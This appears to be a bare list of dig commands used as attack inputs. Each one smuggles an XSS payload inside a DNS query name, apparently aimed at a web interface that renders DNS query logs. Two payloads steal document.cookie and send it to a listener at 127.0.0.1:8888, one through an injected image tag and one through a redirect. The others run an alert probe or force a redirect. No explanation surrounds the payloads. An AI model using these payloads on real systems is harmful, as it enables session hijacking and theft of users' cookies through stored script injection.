dig  "www.google.com 127.0.0.1 2 0 IP<scipt>document.write('<img src=\"http://127.0.0.1:8888/?'+document.cookie+'\"/>');</script> 1736" @127.0.0.1

dig  "www.google.com 127.0.0.1 2 0 IP\"<scipt>document.location='http://127.0.0.1:8888/'+document.cookie</script>\" 1736" @127.0.0.1



dig  "www.google.com 127.0.0.1 2 0 IP<script>alert(8);</script> 1736" @127.0.0.1



dig  "www.google.com 127.0.0.1 2 0 IP<script>document.location='/';</script> 1736" @127.0.0.1



dig  "www.google.com 127.0.0.1 2 0 IP<script>document.location='/';</script> 1736" @127.0.0.1

